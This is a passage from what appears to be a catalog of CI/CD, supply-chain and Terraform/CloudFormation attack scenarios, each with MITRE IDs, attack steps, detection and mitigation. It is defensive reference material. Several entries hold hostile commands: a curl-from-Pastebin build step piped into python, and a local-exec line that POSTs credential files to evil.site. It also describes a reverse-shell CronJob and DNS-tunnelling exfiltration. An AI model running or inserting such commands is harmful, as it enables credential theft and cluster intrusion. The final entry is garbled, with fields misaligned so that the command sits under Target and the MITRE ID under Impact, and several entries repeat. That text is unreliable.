- **Attack Steps**: 1. Developer mistakenly sets image source as corp-registry.internal.domain.com/service-api:latest. 2. Attacker registers a public domain internal-domain.com and hosts a Docker registry there. 3. The CI pipeline, due to lack of strict DNS rules, resolves and pulls the attacker’s image. 4. This Docker image contains malicious init scripts that modify /etc/resolv.conf and install packet sniffers. 5. The build and test pass as the core logic works fine, masking the extra behavior. 6. Upon deployment, users report data leaks and performance issues. 7. Review reveals the hostname resolved to the wrong domain due to missing DNS pinning. 8. Registry logs from the attacker side confirm the image pull events. 9. CI/CD systems are updated to use only pinned IPs or verified registry names. 10. DNS firewall is introduced to block untrusted lookups.
- **Detection**: Use signed and hashed images; enforce registry allowlists
- **Solution**: Audit Docker Compose files for external image hosts
- **Tags**: #dockercompose #registrypoisoning #dnsattack

## Build Script Downloads Python Script from Pastebin

- **Attack Type**: Remote Code Inclusion
- **Target**: Shell Build Steps
- **Vulnerability**: Remote dynamic script abuse
- **MITRE**: T1059.006
- **Impact**: Arbitrary remote code injection
- **Tools**: Bash, Curl, Python
- **Scenario**: A build.sh script downloads and executes a Python file from Pastebin during build, injecting code from the attacker.
- **Attack Steps**: 1. CI script includes curl https://pastebin.com/raw/abc123 -o script.py && python script.py. 2. Pastebin content is not pinned or verified for integrity. 3. Attacker waits and updates the paste content to inject malicious payloads. 4. The payload writes to local config files, modifies build behavior, or uploads secrets. 5. Due to curl-pipe-python, there's no intermediate review of the code. 6. Builds continue as usual until sensitive files are modified. 7. The attacker rotates malicious payloads regularly to avoid signature detection. 8. Incident response reveals abuse of dynamic paste source. 9. All external script downloads are banned and replaced with internal mirror-based pins. 10. Developers are trained on reproducible and pinned builds.
- **Detection**: Ban curl-pipe scripting in CI/CD
- **Solution**: Use SHA-pinned, version-controlled scripts only
- **Tags**: #pastebin #curlpipe #rciattack

## .npmrc Token Harvesting via Cross-Dependency Call

- **Attack Type**: Inter-package Data Leak
- **Target**: Node.js CI Builds
- **Vulnerability**: Token access via nested dependencies
- **MITRE**: T1555.003
- **Impact**: Supply chain token theft
- **Tools**: npm, fs module, axios
- **Scenario**: Two packages — one visible, one malicious — are jointly used, where the hidden one accesses the .npmrc of the environment.
- **Attack Steps**: 1. A dev uses pkg-ui-core and unknowingly includes @attacker/pkg-core-internals. 2. pkg-core-internals includes code that runs during install to check for .npmrc. 3. It reads the auth tokens and prepares a POST request with the credentials. 4. Data is sent to a server that looks legitimate (telemetry.api-utils.io). 5. Since pkg-ui-core depends on the malicious package, its behavior is inherited silently. 6. No CI build errors occur. 7. Eventually, leaked tokens are used to access private packages and exfil code. 8. A reverse dependency scan uncovers the attacker’s injection route. 9. Dependency trees are locked and threat signatures are updated. 10. Access tokens are rotated and npm access is further scoped.
- **Detection**: Enable token access restrictions at runtime
- **Solution**: Lock dependency graph with hashes and peer-reviewed trees
- **Tags**: #nesteddeps #npmrc #credentialtheft

## Rogue CI Step Publishes Debug Build to Public Bucket

- **Attack Type**: Data Leak via Public Cloud Storage
- **Target**: GitHub Actions
- **Vulnerability**: Cloud leak via misused job step
- **MITRE**: T1565.003
- **Impact**: Public exposure of internal binaries
- **Tools**: GitHub Actions, AWS CLI
- **Scenario**: A CI script modified by a contributor pushes debug artifacts to an open S3 bucket for “testing,” leading to data leak.
- **Attack Steps**: 1. Contributor adds a step in .github/workflows/build.yml to aws s3 cp ./debug s3://public-bucket-debug-artifacts. 2. The S3 bucket is misconfigured to allow anonymous access. 3. Sensitive logs, internal tokens, and debug binaries are uploaded. 4. Public URL is discovered by search engine crawlers. 5. Leaked builds appear on code indexing sites. 6. Security team traces this back to the rogue commit. 7. CI audit logging reveals unauthorized job step modification. 8. Debug builds are scrubbed and bucket access is restricted. 9. CI job review and two-person approval are enforced. 10. Bucket access is now private with audit logs enabled.
- **Detection**: Enforce CI script change approvals
- **Solution**: Block public cloud storage uploads from CI
- **Tags**: #ciabuse #s3leak #publicartifact

## Malicious Helm Chart Includes CronJob with Reverse Shell

- **Attack Type**: K8s Resource Abuse
- **Target**: Kubernetes Cluster via Helm
- **Vulnerability**: Resource-level supply chain attack
- **MITRE**: T1053.005
- **Impact**: Periodic shell access to cluster
- **Tools**: Helm, Kubernetes
- **Scenario**: A Helm chart’s templates directory contains a CronJob resource that connects back to attacker.
- **Attack Steps**: 1. A Helm chart secure-k8s-logger is added to the repo. 2. Among legitimate resources, it includes a CronJob definition that runs every 10 minutes. 3. The job starts a container from attacker/cron-shell:v1 which executes a reverse shell. 4. The shell connects to a controlled IP and keeps running for 5 minutes. 5. The container is removed automatically, cleaning up after itself. 6. Monitoring tools do not trigger alerts due to legit container labels. 7. The attacker gains periodic shell access to the cluster node. 8. Cluster logs eventually reveal suspicious outbound traffic patterns. 9. Helm chart audit uncovers the unauthorized CronJob. 10. Helm template scanning is integrated before deployment.
- **Detection**: Use static analysis on Helm templates
- **Solution**: Disallow third-party chart sources unless reviewed
- **Tags**: #helm #cronjob #k8shijack

## Rogue Python Wheel Contains Dual Behavior Logic

- **Attack Type**: Conditional Payload Execution
- **Target**: Python Wheel Build
- **Vulnerability**: Environment-aware payload switching
- **MITRE**: T1620
- **Impact**: Selective data theft in CI only
- **Tools**: Python, Wheel
- **Scenario**: A .whl package behaves normally during tests but activates payloads in CI environments by checking env variables.
- **Attack Steps**: 1. The .whl contains logic that checks for CI=true, GITHUB_ACTIONS=true env vars. 2. If detected, the package runs an alternate logic branch with backdoor payloads. 3. The payload captures secrets, proxy configurations, and user tokens. 4. Data is exfiltrated using DNS tunneling to attacker domains. 5. In local test environments, none of this logic is triggered. 6. Reviewers miss it due to the conditional flag logic. 7. CI audits later identify consistent DNS tunneling patterns. 8. Reverse engineering of .whl package shows embedded conditional blocks. 9. The package is banned and a linter is introduced to block env checks. 10. Static analysis becomes part of build acceptance.
- **Detection**: Detect CI-specific branching in packages
- **Solution**: Limit environment variable exposure to build tools
- **Tags**: #wheel #envdetection #ciaware

## Compromised Gradle Wrapper Downloads Obfuscated Jar

- **Attack Type**: Wrapper Backdoor
- **Target**: Java Build Systems
- **Vulnerability**: Wrapper file hijack
- **MITRE**: T1129
- **Impact**: Execution of undeclared payloads
- **Tools**: Gradle, Java
- **Scenario**: A tampered gradlew file downloads and executes a secondary obfuscated jar not declared in build.gradle.
- **Attack Steps**: 1. The gradlew script is modified to include a curl command to download stage2.jar during the wrapper install. 2. The jar is obfuscated and hidden in .gradle/tmp. 3. The jar opens a socket to the attacker’s server and leaks metadata. 4. Since it's not part of the declared build config, it bypasses artifact scanners. 5. Audit reveals files in cache that aren’t linked in the build script. 6. Static scan flags external downloads in wrapper scripts. 7. Developer confirms it was not intentionally added. 8. Build scripts are purged and replaced with verified versions. 9. Access to wrapper scripts is restricted. 10. Periodic scanning of build directories is enforced.
- **Detection**: Lock down wrapper files via checksum verification
- **Solution**: Strip unauthorized downloads in scripts
- **Tags**: #gradle #wrapperabuse #javabackdoor

## AWS Credentials Hardcoded in Terraform File

- **Attack Type**: Terraform Secrets Exposure
- **Target**: Public GitHub-hosted Terraform Projects
- **Vulnerability**: Secrets exposed in source code
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Full AWS account takeover; privilege escalation; data exfiltration
- **Tools**: GitHub, AWS CLI, GitLeaks
- **Scenario**: AWS keys are accidentally hardcoded into a Terraform variable file, which is then pushed to GitHub. An attacker extracts the keys and gains cloud access.
- **Attack Steps**: 1. A junior developer writes terraform.tfvars to manage AWS infrastructure and directly embeds sensitive AWS credentials like aws_access_key_id and aws_secret_access_key inside the file for testing.2. The developer forgets to add terraform.tfvars to .gitignore and commits the file to a GitHub repository.3. The repo is public or accessed by a malicious user through a leaked invite link.4. The attacker uses GitHub search or tools like GitLeaks to scan for exposed AWS keys in real-time.5. Upon discovery, the attacker configures AWS CLI using aws configure with the exposed keys.6. The attacker lists resources using aws ec2 describe-instances, explores IAM permissions, and checks if they can escalate privileges.7. If permissions allow, the attacker creates new admin users, spins up EC2 instances, downloads S3 bucket contents, or deploys crypto-mining operations.8. The organization only discovers the breach after unusual charges or resource usage alerts from AWS.
- **Detection**: GitHub Advanced Security, GitLeaks, AWS CloudTrail if keys are used
- **Solution**: Use remote backends for state and store secrets in AWS Secrets Manager or CI/CD vaults; block commits with pre-commit hooks like detect-secrets
- **Tags**: #terraform #aws #secrethardcoded #githubleak

## CloudFormation Template Stores DB Password in Plaintext

- **Attack Type**: CloudFormation Secret Exposure
- **Target**: Internal Git Repositories & CloudFormation Templates
- **Vulnerability**: Secrets embedded in infrastructure-as-code
- **MITRE**: T1552.001
- **Impact**: Direct DB compromise, internal data breach
- **Tools**: AWS Console, Git, CloudFormation
- **Scenario**: An RDS database password is written directly into a CloudFormation YAML file, which is stored in Git. Insider or attacker gains access and compromises the DB.
- **Attack Steps**: 1. A DevOps engineer creates a CloudFormation template to deploy an RDS MySQL database.2. To simplify the deployment, they write MasterUserPassword: MyS3cret123! in plaintext under the Properties of the RDS resource.3. The file is committed to a private Git repo shared by multiple developers across teams.4. A disgruntled employee or an attacker with repo access downloads the file and retrieves the database password.5. Using the AWS Console or MySQL CLI, the attacker connects to the RDS instance using mysql -h [endpoint] -u admin -p and logs in with the exposed password.6. The attacker performs SQL queries to extract customer records, application credentials, or configuration secrets.7. Data is silently exfiltrated over time and the access remains undetected if CloudTrail logging for RDS data access isn't enabled.8. The incident is only discovered when anomalies are noticed during an audit or forensic review.
- **Detection**: Git commit scans, RDS login event logs (if auditing enabled)
- **Solution**: Use AWS Secrets Manager or SSM to store and reference secrets; disable plaintext secrets in templates
- **Tags**: #cloudformation #rds #plaintextpassword #iacleak

## GitHub Actions Pipeline Leaks Terraform Secrets in Logs

- **Attack Type**: CI/CD Log Exposure
- **Target**: GitHub Actions CI Logs
- **Vulnerability**: Insecure Terraform variables printed in logs
- **MITRE**: T1552.003 (Credentials in Logs)
- **Impact**: Unauthorized access via leaked logs
- **Tools**: GitHub Actions, Terraform CLI
- **Scenario**: Terraform variables with sensitive credentials are exposed during GitHub Actions run due to misconfigured verbosity in output logs.
- **Attack Steps**: 1. A GitHub Actions workflow is configured to automate infrastructure deployment using Terraform.2. The workflow includes variables like TF_VAR_admin_password, passed through env: or secrets: fields.3. Due to missing sensitive = true in the Terraform variable declarations, the values are printed to the console during terraform plan or terraform apply.4. GitHub Actions retains these logs, and they are accessible via the Actions tab.5. An attacker with access to the repository (including 3rd-party contractors or someone who obtains a stolen GitHub token) views the Actions logs.6. They locate the admin_password in the output logs and use it to connect to downstream infrastructure such as a bastion host, RDS database, or API endpoint.7. Access is used to elevate privileges or inject backdoors.8. The breach remains unnoticed until abnormal behavior or resource use is flagged.
- **Detection**: CI log review, GitHub audit logs, GitHub secret scanning
- **Solution**: Mark variables as sensitive = true in Terraform; restrict GitHub repo access; mask secrets in CI/CD
- **Tags**: #githubactions #terraform #logleak #secretdisclosure

## Terraform State File in Public S3 Bucket

- **Attack Type**: State File Misconfiguration
- **Target**: AWS S3
- **Vulnerability**: World-readable .tfstate with sensitive outputs
- **MITRE**: T1530 (Data from Cloud Storage)
- **Impact**: Multi-service compromise, sensitive data theft
- **Tools**: AWS S3, Terraform, AWS CLI
- **Scenario**: Terraform backend state containing secrets is stored in an S3 bucket with public-read permissions, allowing anyone to download it.
- **Attack Steps**: 1. A team configures a Terraform remote backend using an S3 bucket (terraform-backend-state) but forgets to set proper bucket policies.2. The bucket is accidentally set to public-read to "make collaboration easier" during development.3. The .tfstate file contains outputs like db_password, api_token, and s3_access_key.4. An attacker crawls AWS S3 domains or finds the bucket name listed in forum posts or misconfigured DNS entries.5. Using a simple HTTP GET request, the attacker downloads terraform.tfstate and opens it in a text editor.6. They extract credentials and begin probing connected systems such as RDS, ElasticSearch, or custom APIs.7. The attacker uses the secrets for further lateral movement.8. CloudTrail logs show abnormal access, but are ignored due to alert fatigue.
- **Detection**: AWS S3 access logs, Terraform backend config audits
- **Solution**: Block public S3 access, enable server-side encryption, rotate exposed credentials
- **Tags**: #terraform #s3 #stateleak #bucketmisconfig

## Terraform Plan Output Accidentally Shared with Secrets

- **Attack Type**: Output Leak via Screenshots
- **Target**: Internal Communication Platforms
- **Vulnerability**: Overexposure of secrets during debugging or help requests
- **MITRE**: T1081 (Credential Dumping via Shared Platforms)
- **Impact**: Unintentional but serious data leak
- **Tools**: Terraform CLI, Slack, Teams
- **Scenario**: Secrets from a Terraform plan output are captured in screenshots or pasted into shared chat systems.
- **Attack Steps**: 1. A developer runs terraform plan locally and receives detailed plan output showing values of all variables and resource changes.2. Some variables include sensitive information such as db_admin_password, api_keys, or internal IPs.3. During troubleshooting, the developer copies this output into a shared chat (Slack, MS Teams, Jira, etc.) or posts a screenshot to a ticket.4. These platforms retain logs or screenshots permanently unless manually deleted.5. A malicious insider or attacker with access to these platforms searches for keywords or inspects shared logs.6. They recover the secret and use it to access production services or APIs.7. Access is used for reconnaissance or lateral movement.8. Security teams are unaware until an incident triggers an IR investigation.
- **Detection**: No detection unless chat platforms are audited
- **Solution**: Educate developers on secure debugging; avoid sharing sensitive logs/screenshots
- **Tags**: #terraform #planoutput #secretscreenshot #chatleak

## GitHub Token Hardcoded in Terraform Variable Default

- **Attack Type**: Token Leak via Defaults
- **Target**: GitHub, CI/CD, Terraform Modules
- **Vulnerability**: Hardcoded secrets in variable defaults
- **MITRE**: T1552.001
- **Impact**: Compromise of source code repositories, supply chain poisoning
- **Tools**: Terraform CLI, Git, GitHub
- **Scenario**: A GitHub personal access token is defined as a default value inside a Terraform variable and is committed to Git.
- **Attack Steps**: 1. A developer creates a variables.tf file and defines a variable github_token with a default value: default = "ghp_abcd123456789".2. This file is part of a Terraform module used for configuring GitHub repositories via Terraform’s GitHub provider.3. The file is committed and pushed to a GitHub repository (public or internal).4. The attacker (internal or external) finds the token using GitHub search, GitLeaks, or git log if the secret was removed in later commits.5. Using this token, the attacker authenticates via API (e.g., curl -H "Authorization: token ghp_xxx" https://api.github.com/user/repos) and gains access to private repositories.6. Repositories may include proprietary code, CI/CD configurations, environment files, or additional secrets.7. The attacker can clone sensitive projects or inject malicious changes into CI/CD flows.8. If GitHub organization audit logging isn’t configured, this access goes unnoticed.
- **Detection**: GitHub Advanced Security, GitLeaks, repo audit logs
- **Solution**: Avoid using default for secrets; use TF_VAR_ or secret manager integrations
- **Tags**: #terraform #github #apitoken #hardcodedsecret

## Terraform Outputs Print Secrets to Console

- **Attack Type**: Output Variable Misuse
- **Target**: Jenkins Console, CI Pipelines
- **Vulnerability**: Unmarked sensitive output exposing secrets
- **MITRE**: T1552.003
- **Impact**: Privilege escalation via CI/CD secrets leak
- **Tools**: Terraform CLI, Jenkins
- **Scenario**: Terraform output variables display sensitive secrets in CLI or CI/CD pipelines, leaking them to logs or screens.
- **Attack Steps**: 1. A developer defines an output block in outputs.tf: output "admin_password" { value = var.admin_password }.2. The admin_password variable is passed during runtime or from a secret manager, but the output is not marked as sensitive = true.3. When terraform apply or terraform output is executed, the password is printed clearly in the terminal or in Jenkins logs.4. Jenkins pipelines archive logs or expose them via open-access consoles within the organization.5. A developer or malicious actor with access to Jenkins history navigates to the build and retrieves the password from the archived output.6. They use it to access internal dashboards, VM instances, or databases.7. No alert is raised because the logs are assumed safe.8. A compromise occurs silently and is discovered later during credential rotation audits.
- **Detection**: Jenkins logs, Terraform CLI outputs
- **Solution**: Mark sensitive outputs using sensitive = true; restrict CI log access
- **Tags**: #terraform #output #jenkins #secretinlogs

## Git Commit History Exposes Removed Secret

- **Attack Type**: Git History Secret Retention
- **Target**: Git History
- **Vulnerability**: Residual secrets in Git history
- **MITRE**: T1552.001
- **Impact**: Persistent exposure despite code cleanup
- **Tools**: Git CLI, GitHub, GitLeaks
- **Scenario**: A secret added and then removed from Terraform code remains recoverable through Git history or blame.
- **Attack Steps**: 1. A developer accidentally includes a hardcoded secret in main.tf (e.g., db_token = "xyz123").2. Realizing the mistake, they delete the line and commit a fix in the next commit.3. However, the secret remains in the Git history (git log, git show) and is recoverable.4. An attacker forks or clones the repo and runs git log -p or GitLeaks to identify credentials present in any commit delta.5. The attacker retrieves the token and uses it to access the associated database or API.6. Since the latest code does not contain the secret, no one notices unless scanning history.7. If the secret is reused across environments, the attacker may use it for lateral access.8. Incident is only discovered much later when threat intelligence correlates the token’s misuse.
- **Detection**: GitLeaks, commit diff auditing
- **Solution**: Use tools like BFG Repo-Cleaner or git filter-branch; rotate credentials
- **Tags**: #terraform #git #secrethistory #commitleak

## CloudFormation Sends Plaintext Secret to SSM Parameter Store

- **Attack Type**: Misconfigured Secret Storage
- **Target**: AWS Parameter Store
- **Vulnerability**: Use of unencrypted String instead of SecureString
- **MITRE**: T1552
- **Impact**: Secret exposure through insecure storage mechanism
- **Tools**: AWS Console, CloudFormation, IAM
- **Scenario**: A CloudFormation template writes a secret to AWS SSM Parameter Store without encryption enabled, making it readable by other services.
- **Attack Steps**: 1. A developer writes a CloudFormation template that creates a new DB password and stores it in SSM using the ParameterType: String (instead of SecureString).2. The parameter is created in plaintext, readable via ssm:GetParameter.3. IAM roles of EC2 instances, Lambda functions, or users are overly permissive, allowing access to all SSM parameters.4. An attacker compromises a Lambda function with ssm:GetParameter permissions and reads the parameter via API call.5. The retrieved password is then used to connect to the database, modify schema, or dump sensitive records.6. Since no audit tagging or CloudTrail alerts were enabled for SSM access, the misuse is undetected.7. Blue Team only finds the issue during a post-breach IAM review.
- **Detection**: IAM audit logs, CloudTrail (if enabled)
- **Solution**: Always use SecureString for secrets and limit IAM access
- **Tags**: #ssm #cloudformation #parameterstore #plaintext

## Terraform Plan Output Leaks Secrets in Jenkins Console

- **Attack Type**: Console Output Secret Exposure
- **Target**: Jenkins Pipelines
- **Vulnerability**: Secret values logged in plain CLI output
- **MITRE**: T1552.003
- **Impact**: Infrastructure compromise through log mining
- **Tools**: Jenkins, Terraform CLI
- **Scenario**: A Jenkins pipeline runs Terraform with plan and apply stages, unintentionally exposing sensitive values in console logs.
- **Attack Steps**: 1. Jenkins is configured to run terraform init, plan, and apply as part of the deployment stage.2. The Terraform code includes variables like api_key, root_password, passed from environment variables or from secrets stored in the Jenkins credential store.3. The terraform plan command is run without silencing output and without marking variables as sensitive = true.4. The console prints the full execution plan including the secret values (e.g., "Create aws_instance with user=root, password=Admin123").5. Console logs are archived and visible to all users in the Jenkins instance.6. An insider or attacker with Jenkins user access retrieves secrets directly from the logs.7. They use these credentials to gain unauthorized access to infrastructure.8. Since secrets were leaked through logs and not traditional access methods, they bypass secret detection tools.
- **Detection**: Jenkins build console logs, access logs
- **Solution**: Sanitize Terraform output; restrict console access; use sensitive flags
- **Tags**: #terraform #jenkins #consoleleak #logsecrets

## Terraform Variable Defaults Contain Hardcoded GitHub Token

- **Attack Type**: Secret Leak via Variable Defaults
- **Target**: GitHub, CI/CD
- **Vulnerability**: Hardcoded secrets in Terraform variable defaults
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to private repos or CI pipelines
- **Tools**: Terraform CLI, GitHub, GitLeaks
- **Scenario**: A GitHub PAT is hardcoded as a default variable in Terraform, making it accessible in both the repo and CI/CD logs.
- **Attack Steps**: 1. A developer defines a sensitive GitHub token using a Terraform variable block like:variable "github_token" { default = "ghp_xxx123abc456" }.2. This variable is used to authenticate with GitHub via the Terraform GitHub provider.3. The file is added to Git and pushed to a public or private repository without proper secret masking.4. In public repos, attackers may use GitHub’s search API, GitDorking, or automated scanners like GitLeaks or TruffleHog to detect hardcoded secrets.5. In private repos, malicious insiders or overprivileged CI/CD users can easily extract the token.6. Once obtained, the attacker uses the token to interact with GitHub's API (e.g., listing private repositories, cloning code, editing workflows).7. If the token has repo scope, the attacker can poison the CI/CD pipeline, steal code, or plant backdoors.8. Without proper audit logging or rotation, the leak may go undetected for weeks.
- **Detection**: GitHub Advanced Security, GitLeaks, token use in logs
- **Solution**: Never use default for secrets; use TF_VAR_ or inject at runtime from a secure store
- **Tags**: #terraform #hardcodedsecrets #githubtoken

## Terraform Outputs Leak Admin Password to Terminal and Logs

- **Attack Type**: Plaintext Secret in Output
- **Target**: CI/CD Logs, Jenkins Console
- **Vulnerability**: Unmasked secrets in output
- **MITRE**: T1552.003
- **Impact**: Compromise of internal systems through leaked logs
- **Tools**: Terraform CLI, Jenkins
- **Scenario**: Terraform outputs are not marked as sensitive, causing secrets to appear in CLI and pipeline logs.
- **Attack Steps**: 1. A developer sets an output in outputs.tf like:output "admin_password" { value = var.admin_password }.2. They forget to mark it as sensitive = true.3. During terraform apply, this password is printed to the console.4. In CI/CD environments like Jenkins, the full apply output is often captured in job logs or build artifacts.5. These logs are accessible to all users with project-level access or stored for audit purposes, making the password retrievable.6. An attacker with Jenkins read-only permissions accesses archived logs and extracts the password.7. The attacker logs into infrastructure systems using the credentials.8. Because the leak is in logs, secret scanning tools may not catch it unless they also scan artifacts or console output history.
- **Detection**: Review of Jenkins logs, Terraform plan/apply output
- **Solution**: Mark outputs as sensitive = true; limit log access; mask secrets in CI
- **Tags**: #terraform #jenkins #outputleak #logrisk

## Git History Exposes Removed Secrets from Terraform Code

- **Attack Type**: Secret in Commit History
- **Target**: Git Repo, GitHub, GitLab
- **Vulnerability**: Persistent secrets in Git history
- **MITRE**: T1552.001
- **Impact**: Unauthorized access via historical code artifact
- **Tools**: Git CLI, GitLeaks, GitHub
- **Scenario**: A secret once present in a Terraform file and later deleted remains accessible via Git history.
- **Attack Steps**: 1. A developer includes a secret in Terraform code (e.g., db_password = "SuperSecret123").2. They realize the mistake and delete the line in a new commit.3. However, the original commit remains in Git history and can be recovered with git log, git show, or git blame.4. Even if the line was altered or removed, tools like GitLeaks or TruffleHog detect secrets in previous commit deltas.5. A malicious user or external attacker with repo access runs these tools to extract historical secrets.6. They use the credentials to gain access to cloud services or infrastructure.7. This attack often goes unnoticed because the active code no longer contains the secret.8. Detection only happens during a post-incident audit or automated history scan.
- **Detection**: GitLeaks scan, commit diff analysis
- **Solution**: Rewrite history using BFG or git filter-branch, rotate secrets
- **Tags**: #gitleak #terraform #historysecrets

## CloudFormation Stack Outputs Reveal Credentials

- **Attack Type**: Insecure Output Metadata
- **Target**: AWS Stack Output
- **Vulnerability**: Sensitive values in CF output
- **MITRE**: T1552
- **Impact**: Infrastructure access via metadata API
- **Tools**: AWS CloudFormation, AWS CLI
- **Scenario**: CloudFormation outputs sensitive information that is accessible to any IAM user with stack read permissions.
- **Attack Steps**: 1. A CloudFormation template contains a section like:Outputs: AdminPassword: Value: !Ref DBAdminPassword.2. The stack is deployed into an AWS account shared by multiple developers or services.3. IAM policies allow users to run DescribeStacks, either directly or indirectly.4. Any user with this permission can execute:aws cloudformation describe-stacks5. The command returns stack outputs, including the exposed password.6. An attacker with compromised credentials uses the output to retrieve secrets and logs into the associated database.7. Since access to DescribeStacks is not always monitored, this occurs without alert.8. Detection happens only during suspicious access patterns or IAM audit.
- **Detection**: CloudTrail for DescribeStacks (if enabled)
- **Solution**: Avoid storing secrets in stack outputs; restrict IAM permissions
- **Tags**: #cloudformation #aws #metadataexposure

## Terraform Backend File Reveals S3 State Location

- **Attack Type**: State Location Recon
- **Target**: Terraform Backend on AWS S3
- **Vulnerability**: Public knowledge of state file path
- **MITRE**: T1530
- **Impact**: Reconnaissance and state theft
- **Tools**: GitHub, Terraform, AWS S3
- **Scenario**: Terraform backend.tf reveals bucket and key used to store the remote state file, exposing info for further enumeration.
- **Attack Steps**: 1. The backend.tf file is committed with content such as:bucket = "corp-terraform-backend"key = "prod/infrastructure.tfstate".2. The repo is public, or internal but accessible to many users.3. An attacker discovers the bucket name and key path.4. They attempt to enumerate the S3 bucket via public AWS APIs or brute force.5. If the S3 bucket permissions are misconfigured (e.g., ListBucket or GetObject granted), the attacker downloads the state file.6. The .tfstate may contain IPs, IAM ARNs, service tokens, or embedded secrets.7. The attacker uses these to map infrastructure or pivot.8. The organization realizes only when abnormal API activity or privilege escalation is detected.
- **Detection**: S3 logs, Git repo audit
- **Solution**: Avoid committing backend config; restrict S3 permissions
- **Tags**: #terraform #s3backend #statetheft

## CloudFormation Template Uses Plaintext SSM Parameter

- **Attack Type**: SSM Secret Misclassification
- **Target**: AWS SSM Parameter Store
- **Vulnerability**: Misuse of String for secrets
- **MITRE**: T1552
- **Impact**: Easy access to sensitive data across services
- **Tools**: AWS CloudFormation, IAM, SSM
- **Scenario**: Secrets are stored in AWS SSM Parameter Store using String instead of SecureString, allowing broad read access.
- **Attack Steps**: 1. A CloudFormation template creates a parameter like:Type: AWS::SSM::ParameterProperties: Type: String, Value: "MySuperSecret".2. Instead of using SecureString, the developer uses String due to convenience or lack of awareness.3. This parameter becomes retrievable by any IAM principal with ssm:GetParameter.4. A Lambda function or EC2 instance with wide SSM read access can now read the secret.5. If an attacker compromises one such resource, they execute:aws ssm get-parameter --name "MyParam" --with-decryption6. Since the secret was stored as plaintext, no decryption is needed.7. The attacker uses the value to escalate privileges or move laterally.8. Detection is hard unless CloudTrail logs are reviewed with parameter-level filtering.
- **Detection**: CloudTrail (if configured), IAM access logs
- **Solution**: Always use SecureString for secrets, restrict IAM access
- **Tags**: #ssm #cloudformation #plaintext

## Terraform State File Uploaded to Git Repository

- **Attack Type**: tfstate in Git
- **Target**: GitHub Repo
- **Vulnerability**: Committed state file with secrets
- **MITRE**: T1552.001
- **Impact**: Full compromise of deployed resources
- **Tools**: Git, Terraform, GitHub
- **Scenario**: Terraform state file containing secrets is committed to the repo and exposed publicly.
- **Attack Steps**: 1. A developer runs Terraform locally and generates a terraform.tfstate file.2. The file includes outputs like generated passwords, access tokens, or IP addresses.3. The developer mistakenly commits the .tfstate file to Git and pushes it to GitHub.4. The repo is public or exposed to contractors.5. An attacker or bug bounty hunter finds the .tfstate file using GitHub search or dorking.6. They download it and parse the JSON structure to extract secrets.7. These values are used to access production resources.8. The team only notices after unusual activity is observed in cloud logs.
- **Detection**: GitHub secret scanning, repo audits
- **Solution**: Add .tfstate to .gitignore; use remote backends
- **Tags**: #terraform #tfstateleak #gitrisk

## Terraform Plan Output Posted to Slack

- **Attack Type**: Plan Output Leakage
- **Target**: Slack, GitHub Actions
- **Vulnerability**: Unsafe posting of secrets to messaging tools
- **MITRE**: T1552.003
- **Impact**: External exposure of secrets to third-party systems
- **Tools**: Terraform, Slack API, GitHub Actions
- **Scenario**: A CI/CD tool posts terraform plan output (containing secrets) to Slack via webhook for team review.
- **Attack Steps**: 1. CI pipeline runs terraform plan and posts the result to a Slack channel via bot webhook.2. Secrets like database passwords or API tokens appear in output because variables were not marked sensitive.3. Slack channels are accessible to many developers, interns, or contractors.4. A malicious insider or someone with Slack access (e.g., via stolen token) sees the secret.5. They use the secret to access internal apps, databases, or cloud services.6. Since the leak occurs outside of infra (i.e., in Slack), it bypasses traditional secret detection tools.7. Incident is discovered during an IAM review or Slack audit.8. Company realizes critical secrets were exposed to dozens of users.
- **Detection**: Slack API logs (if enabled)
- **Solution**: Avoid posting sensitive plan output; use redacted summaries
- **Tags**: #terraform #slack #outputleak

## .terraform.lock.hcl Reveals Provider Versions with Known CVEs

- **Attack Type**: Metadata Disclosure
- **Target**: Terraform Lock File
- **Vulnerability**: Committed file reveals exploitable provider versions
- **MITRE**: T1068
- **Impact**: Use of vulnerable provider version
- **Tools**: Terraform, GitHub
- **Scenario**: The lock file reveals plugin versions with known vulnerabilities.
- **Attack Steps**: 1. Terraform generates .terraform.lock.hcl after initialization.2. This file records exact versions of providers used (e.g., AWS 3.42.0).3. It is committed to version control without restriction.4. An attacker finds the file and checks for vulnerabilities in the provider version (e.g., CVEs affecting AWS provider 3.42.0).5. If the provider version allows unintended privilege escalation or IAM policy overwrite, attacker crafts a plan.6. They phish a developer or use an SSRF to interact with Terraform deployed infra.7. The known CVE allows elevation of privileges due to misconfiguration.8. This silent exploitation goes unnoticed unless provider versions are actively monitored.
- **Detection**: Version audit tools, CVE matching
- **Solution**: Monitor provider version advisories; auto-update plugins
- **Tags**: #terraform #lockfile #cveexploit

## Terraform Example File Contains Real Access Keys

- **Attack Type**: Credential Leak in Example Code
- **Target**: GitHub Public Repo
- **Vulnerability**: Valid credentials left in example files
- **MITRE**: T1552.001
- **Impact**: Unauthorized cloud access and financial loss
- **Tools**: Terraform, GitHub
- **Scenario**: An example file (example.tfvars) in a public module includes valid AWS access keys used for demo.
- **Attack Steps**: 1. An engineer creates an open-source module and includes an examples/ folder to demonstrate usage.2. To test functionality, they insert real access keys into example.tfvars, planning to remove them later.3. They push the example to GitHub but forget to sanitize credentials.4. GitHub’s secret scanning triggers an alert, but it’s ignored.5. An attacker finds the repo and extracts the keys.6. They use the keys to authenticate via AWS CLI and list resources or spin up EC2 instances.7. The AWS account incurs charges and suffers data exfiltration.8. The incident is discovered via unexpected billing alerts.
- **Detection**: GitHub token detection, billing alerts
- **Solution**: Never include real keys in examples; rotate all test credentials
- **Tags**: #terraform #exampleleak #accesskey

## Terraform Local Exec Executes Credential Dump on Apply

- **Attack Type**: Malicious Local Provisioner
- **Target**: curl -X POST https://evil.site/upload -d @" }```2. This block is triggered during terraform apply, executing on the machine where Terraform is run (e.g., developer’s workstation or CI runner).3. It reads local credential files (e.g., AWS CLI config) and sends them to a remote server.4. Since local-exec commands are not always reviewed or blocked, this executes without suspicion.5. The attacker now uses the credentials to interact with AWS services using the AWS CLI, potentially enumerating resources, accessing S3, or elevating privileges.6. Blue Team only notices this after credentials are seen in third-party logs or via CloudTrail anomalies.7. Purple Team discovers misuse of local-exec for code execution during IaC reviews.
- **Vulnerability**: Developer Machines / CI
- **MITRE**: Local-exec allows arbitrary execution
- **Impact**: T1059.004
- **Tools**: Terraform CLI, Bash, AWS CLI
- **Scenario**: Attacker adds a local-exec provisioner in Terraform that exfiltrates AWS credentials on apply.
